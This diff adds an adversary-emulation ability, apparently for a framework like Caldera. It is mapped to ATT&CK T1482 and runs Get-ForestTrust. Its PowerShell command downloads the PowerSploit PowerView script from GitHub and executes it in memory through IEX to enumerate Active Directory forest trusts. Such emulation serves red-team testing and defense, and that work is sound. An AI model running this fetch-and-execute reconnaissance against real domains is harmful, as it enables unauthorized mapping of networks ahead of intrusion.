@@ -1,0 +1,23 @@
+---
+- id: feb9647c55185e3b6045293fd26f6a5b
+  name: Get-ForestTrust with PowerView
+  description: 'Utilizing PowerView, run Get-ForestTrust to identify forest trusts.
+    Upon execution, progress and info about forest trusts within the domain being
+    scanned will be displayed.
+
+    '
+  tactic: discovery
+  technique:
+    attack_id: T1482
+    name: Domain Trust Discovery
+  platforms:
+    windows:
+      psh:
+        command: '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+          IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1''
+          -UseBasicParsing); Get-ForestTrust -Verbose'
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
